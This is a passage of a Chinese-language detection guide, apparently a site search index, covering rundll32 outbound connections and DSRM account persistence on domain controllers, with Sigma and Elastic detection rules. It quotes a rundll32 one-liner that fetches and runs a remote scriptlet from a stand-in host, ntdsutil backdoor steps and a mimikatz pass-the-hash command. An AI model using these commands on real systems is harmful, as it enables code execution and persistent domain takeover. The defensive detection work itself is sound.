<p>http://www.safe6.cn/article/155</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/","title":"T1218-011-win-\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002</p> <p>Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002</p> <p>Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Rundll32.exe\u662f\u6307\u201c\u6267\u884c32\u4f4d\u7684DLL\u6587\u4ef6\u201d\u3002\u5b83\u7684\u4f5c\u7528\u662f\u6267\u884cDLL\u6587\u4ef6\u4e2d\u7684\u5185\u90e8\u51fd\u6570,\u529f\u80fd\u5c31\u662f\u4ee5\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u8c03\u7528\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u5e93\u3002</p> <p>\u8bf4\u660e\uff1aRundll32.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cWmic\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Rundll32\u8c03\u7528\u3002</p> <p>windows 2003\u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\Windows\\System32\\rundll32.exe\nC:\\Windows\\SysWOW64\\rundll32.exe\n</code></pre> <p>win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\Windows\\System32\\rundll32.exe\nC:\\Windows\\SysWOW64\\rundll32.exe\n</code></pre> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u8bc6\u522brundll32.exe\u8fdb\u884c\u51fa\u7ad9\u7f51\u7edc\u8fde\u63a5\u7684\u5f02\u5e38\u884c\u4e3a\u3002\u8fd9\u8868\u660e\u53ef\u80fd\u5b58\u5728\u653b\u51fb\u6d3b\u52a8\uff0c\u5e76\u53ef\u80fd\u8ba4\u8bc6\u6076\u610fDLL\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u53ef\u53c2\u8003\uff1aT1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Rundll32.exe\u6267\u884cpayload</p> <p>Examples of 5156</p> <pre><code>The Windows Filtering Platform has allowed a connection.\n\nApplication Information:\n\n  Process ID: 1752\n  Application Name: \\device\\harddiskvolume1\\windows\\system32\\dns.exe\n\nNetwork Information:\n\n  Direction: Inbound\n  Source Address: 10.45.45.103\n  Source Port: 53\n  Destination Address: 10.45.45.103\n  Destination Port: 50146\n  Protocol: 17\n\nFilter Information:\n\n  Filter Run-Time ID: 5\n  Layer Name: Receive/Accept\n  Layer Run-Time ID: 44\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#sigma","title":"sigma","text":"<pre><code>title: \u68c0\u6d4b\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5\u884c\u4e3a\ndescription: \u901a\u8fc7windows\u65e5\u5fd7\u6765\u68c0\u6d4b\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5\u884c\u4e3a\nstatus: experimental\nreferences:\n    - https://www.elastic.co/guide/en/siem/guide/current/unusual-network-connection-via-rundll32.html\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.T1085\n    - attack.TA0002\ndate: 2020/12/2\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        EventID: 5156\n        Process.name: 'rundll32.exe' #Application Name\n    selection2:\n        Destination Address:\n                        - 10.0.0.0/8\n                        - 172.16.0.0/12 \n                        - 192.168.0.0/16\n    condition: selection1 and not selection2\nlevel: low\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#elastic-rule-query","title":"Elastic rule query","text":"<pre><code>process.name:rundll32.exe and event.action:\"Network connection\ndetected (rule: NetworkConnect)\" and not destination.ip:(10.0.0.0/8 or\n172.16.0.0/12 or 192.168.0.0/16 or 127.0.0.0/8)\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_6","title":"\u5efa\u8bae","text":"<p>\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790rundll32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83rundll32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728rundll32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-011</p> <p>https://attack.mitre.org/techniques/T1218/011/</p> <p>\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5</p> <p>https://www.elastic.co/guide/en/siem/guide/current/unusual-network-connection-via-rundll32.html</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/","title":"T1078-001-win-DSRM\u5bc6\u7801\u91cd\u7f6e","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u76ee\u5f55\u8fd8\u539f\u6a21\u5f0f\u8d26\u6237</p> <p>\u6bcf\u4e00\u4e2a\u57df\u63a7\u5236\u5668\u90fd\u6709\u4e00\u4e2a\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u5176\u5b9e\u4e5f\u5c31\u662f\u6240\u8c13\u7684\u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\uff08DSRM\uff09\u8d26\u6237\u3002DSRM\u7684\u5bc6\u7801\u662f\u5728DC\u5b89\u88c5\u7684\u65f6\u5019\u5c31\u9700\u8981\u8bbe\u7f6e\uff0c\u5e76\u4e14\u5f88\u5c11\u4f1a\u88ab\u91cd\u7f6e\u3002\u4fee\u6539DSRM\u5bc6\u7801\u6700\u57fa\u672c\u7684\u65b9\u6cd5\u662f\u5728DC\u4e0a\u8fd0\u884cntdsutil\u547d\u4ee4\u884c\u5de5\u5177\u3002</p> <p>\u5728\u5b89\u88c5\u4e86KB961320\u8865\u4e01\u7684Windows Server 2008\u4ee5\u53ca\u4e4b\u540e\u53d1\u5e03\u7684Windows Server\u4e2d\uff0c\u5f00\u59cb\u652f\u6301\u5728DC\u4e0a\u4f7f\u7528\u6307\u5b9a\u7684\u57df\u5e10\u6237\u540c\u6b65DSRM\u5bc6\u7801\u3002\u4f46\u662f\u8fd9\u4e2a\u540c\u6b65\u64cd\u4f5c\u662f\u4e00\u6b21\u6027\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f60\u5fc5\u987b\u5728\u6bcf\u6b21\u66f4\u6539\u4e86DSRM\u5bc6\u7801\u540e\u8fdb\u884c\u4e00\u6b21\u5bc6\u7801\u540c\u6b65\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u653b\u51fb\u8005\u53ef\u4ee5\u5f97\u5230\u8fd0\u884c\u5728Windows Server 2008 R2\u6216 Windows Server 2012 R2\uff08DsrmAdminLogonBehavior\u7684\u503c\u4e3a2\uff09\u7684\u57df\u63a7\u7684DSRM\u8d26\u6237\u5bc6\u7801\u6216\u8005HASH\u503c\uff0c\u90a3\u4e48DSRM\u8d26\u6237\u5c31\u53ef\u4ee5\u88ab\u7528\u4e8e\u201cHASH\u4f20\u9012\u653b\u51fb\u201d\u65b9\u5f0f\u3002\u8fd9\u5c31\u4f7f\u5f97\u653b\u51fb\u8005\u53ef\u4ee5\u4fdd\u6301\u57df\u63a7\u5236\u5668\u7684\u7ba1\u7406\u5458\u6743\u9650\uff0c\u5373\u4f7f\u6240\u6709\u7684\u57df\u7528\u6237\u548c\u8ba1\u7b97\u673a\u5bc6\u7801\u88ab\u4fee\u6539\u4e86\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#0x00-dsrm","title":"0x00 \u66f4\u6539DSRM\u8d26\u53f7\u5bc6\u7801","text":"<p>\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4(DC\u4e0a)</p> <pre><code>NTDSUTIL\nset dsrm password\nreset password on server null\n&lt;PASSWORD&gt;\nQ\nQ\n</code></pre> <p>\u5b9e\u9645\u6d4b\u8bd5\u7ed3\u679c\uff1a</p> <pre><code>C:\\Users\\Administrator&gt;ntdsutil\nntdsutil: set dsrm password\n\u91cd\u7f6e DSRM \u7ba1\u7406\u5458\u5bc6\u7801: reset password on server null\n\u8bf7\u952e\u5165 DS \u8fd8\u539f\u6a21\u5f0f Administrator \u5e10\u6237\u7684\u5bc6\u7801: *********\n\u8bf7\u786e\u8ba4\u65b0\u5bc6\u7801: *********\n\u5bc6\u7801\u8bbe\u7f6e\u6210\u529f\u3002\n\n\u91cd\u7f6e DSRM \u7ba1\u7406\u5458\u5bc6\u7801: Q\nntdsutil: Q\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#0x01-dsrm","title":"0x01 \u4f7f\u7528\u57df\u5e10\u6237\u540c\u6b65DSRM\u8d26\u6237\u5bc6\u7801","text":"<p>\u4f7f\u7528\u57df\u7ba1\u7406\u5458\u5e10\u6237\u767b\u5f55DC\u540e\uff0c\u542f\u52a8\u4e00\u4e2a\u201c\u53d6\u5f97\u7ba1\u7406\u5458\u6743\u9650\u201d\u7684CMD\uff0c\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\u884c\uff1a</p> <pre><code>NTDSUTIL\nSET DSRM PASSWORD\nSYNC FROM DOMAIN ACCOUNT &lt;your user here&gt;\nQ\nQ\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#0x02-dsrm","title":"0x02 \u4f7f\u7528DSRM\u4f5c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u7684\u540e\u95e8","text":"<p>\u6709\u5173DSRM\u5bc6\u7801\u7684\u4e00\u4e2a\u6709\u610f\u601d\u7684\u4e8b\u60c5\u662f\u8fd9\u4e2aDSRM\u8d26\u6237\u5b9e\u9645\u4e0a\u5c31\u662f\u201cAdministrator\u201d\u3002\u8fd9\u5c31\u610f\u5473\u7740\u4e00\u65e6\u653b\u51fb\u8005\u6709\u4e86DC\u7684DSRM\u5bc6\u7801\uff0c\u5c31\u6709\u53ef\u80fd\u4f7f\u7528\u8fd9\u4e2a\u8d26\u6237\u901a\u8fc7\u7f51\u7edc\u4f5c\u4e3a\u4e00\u4e2a\u672c\u5730\u7ba1\u7406\u5458\u767b\u5f55\u5230DC\u4e0a\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6cd5\u56fd\u4f6c\u795e\u5668\uff08mimikatz\uff09\u6765\u786e\u8ba4DSRM\u8d26\u53f7\u5c31\u662f\u672c\u5730\u7ba1\u7406\u5458\u5e10\u6237\u3002\u9996\u5148\uff0c\u4f7f\u7528\u4e00\u4e2a\u5df2\u77e5\u7684\u5bc6\u7801\u521b\u5efa\u4e00\u4e2aAD\u7528\u6237\uff08xiaomi\uff09\uff0c\u4e4b\u540e\uff0c\u4f7f\u7528\u8fd9\u4e2a\u57df\u8d26\u6237\u8fdb\u884cDSRM\u5bc6\u7801\u540c\u6b65\u64cd\u4f5c\u3002</p> <p>\u5177\u4f53\u64cd\u4f5c\u547d\u4ee4\u53ef\u4ee5\u53c2\u80030x01\u547d\u4ee4</p> <p>\u5173\u4e8e\u66f4\u591a\u4f7f\u7528DSRM\u4f5c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u540e\u95e8\u7684\u7528\u6cd5\u53ef\u4ee5\u53c2\u8003Freebuf\u6587\u4e2d\u63d0\u5230\u65b9\u6cd5\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#0x03-dsrm","title":"0x03 \u4f7f\u7528DSRM\u51ed\u8bc1\u7684\u4e00\u79cd\u66f4\u4e3a\u9ad8\u7ea7\u7684\u65b9\u6cd5","text":"<p>\u6b63\u59820x02\u6240\u8ff0\uff0cDSRM\u8d26\u6237\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u53ef\u7528\u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u9a8c\u8bc1\u5e76\u767b\u5f55\u5230DC\u4e2d\uff0c\u5f53\u7136\uff0c\u8981\u786e\u4fddDsrmAdminLogonBehavior\u6ce8\u518c\u8868\u952e\u7684\u503c\u4e3a 2\u3002\u53e6\u5916\uff0c\u653b\u51fb\u8005\u5e76\u4e0d\u9700\u8981\u77e5\u9053DSRM\u8d26\u6237\u7684\u771f\u5b9e\u5bc6\u7801\uff0c\u53ea\u9700\u8981\u77e5\u9053\u8fd9\u4e2a\u8d26\u6237\u7684HASH\u503c\u3002\u8fd9\u5c31\u610f\u5473\u7740\u4e00\u65e6\u653b\u51fb\u8005\u6709\u4e86DSRM\u8d26\u6237\u7684HASH\u503c\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u4f7f\u7528\u201cHASH\u4f20\u9012\u653b\u51fb\u201d\u65b9\u5f0f\uff0c\u5e76\u4ee5\u4e00\u4e2a\u7ba1\u7406\u5458\u7684\u8eab\u4efd\u8bbf\u95eeDC\u3002\u8fd9\u4e2a\u65b9\u6cd5\u5728Windows Server 2008 R2\u548cWindows Server 2012 R2\u7684\u57df\u63a7\u4e2d\u5df2\u7ecf\u6d4b\u8bd5\u6210\u529f\u4e86\u3002</p> <p>\u4f7f\u7528\u6cd5\u56fd\u4f6c\u795e\u5668\uff08mimikatz\uff09\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u884c\uff1a</p> <pre><code>Mimikatz \u201cprivilege::debug\u201d \u201csekurlsa::pth /domain:xiaomi.org /user:administrator /ntlm:7c08d63a2f48f045971bc2236ed3f3ac\u201d exit\n</code></pre> <p>\u6ce8\u610f\u7684\u662f\uff1a\u7531\u4e8eDSRM\u8d26\u6237\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u53ef\u7528\u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237administrator\uff0c\u6240\u4ee5\u5728\u6b64\u5904\uff0c\u53ef\u4ee5\u8fd9\u4e48\u7406\u89e3\uff0c\u653b\u51fb\u8005\u77e5\u9053DC\u672c\u5730\u8d26\u6237administrator\u7684NTML HASH\uff0c\u4f7f\u7528mimikatz\u8fdb\u884cHASH\u4f20\u9012\u8fdb\u884c\u653b\u51fb\uff0c\u8fbe\u5230\u4ee5DC\u672c\u5730\u8d26\u6237administrator\u7684\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\u8bbf\u95eeDC\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd74794</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: \u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\uff08DSRM\uff09\u5e10\u6237\u4e0a\u7684\u5bc6\u7801\u66f4\u6539\nstatus: \u7a33\u5b9a\ndescription: \u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\uff08DSRM\uff09\u5e10\u6237\u662f\u57df\u63a7\u5236\u5668\u4e0a\u7684\u672c\u5730\u7ba1\u7406\u5458\u5e10\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u66f4\u6539\u5bc6\u7801\u4ee5\u83b7\u5f97\u6301\u4e45\u6027\u3002\nreferences:\n    - https://adsecurity.org/?p=1714\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1098\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4794 #\u8bd5\u56fe\u8bbe\u7f6e\u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\u7ba1\u7406\u5458\u5bc6\u7801\n    condition: selection\nfalsepositives:\n    - Initial installation of a domain controller\nlevel: high\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_6","title":"\u5efa\u8bae","text":"<p>1.\u76d1\u63a7\u4e0eDSRM\u5bc6\u7801\u91cd\u7f6e\u548c\u4f7f\u7528\u76f8\u5173\u7684\u4e8b\u4ef6\u65e5\u5fd7</p> <p>4794\uff1a\u8bd5\u56fe\u8bbe\u7f6e\u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\u7ba1\u7406\u5458\u5bc6\u7801\u3002</p> <p>2.\u76d1\u63a7\u5982\u4e0b\u6ce8\u518c\u8868\u4f4d\u7f6e\u7684\u503c\uff0c\u5f53\u503c\u4e3a 1 \u6216 2\u65f6\uff0c\u5e94\u5f15\u8d77\u8b66\u793a</p> <pre><code>HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DSRMAdminLogonBehavior\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1078-001</p> <p>https://attack.mitre.org/techniques/T1078/001/</p> <p>\u57df\u63a7\u6743\u9650\u6301\u4e45\u5316\u4e4bDSRM</p> <p>https://www.freebuf.com/articles/system/80968.html</p> <p>\u5de7\u7528DSRM\u5bc6\u7801\u540c\u6b65\u5c06\u57df\u63a7\u6743\u9650\u6301\u4e45\u5316</p> <p>https://www.uedbox.com/post/10269/</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/","title":"T1098-Windows-AdminSDHolder","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u548c\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f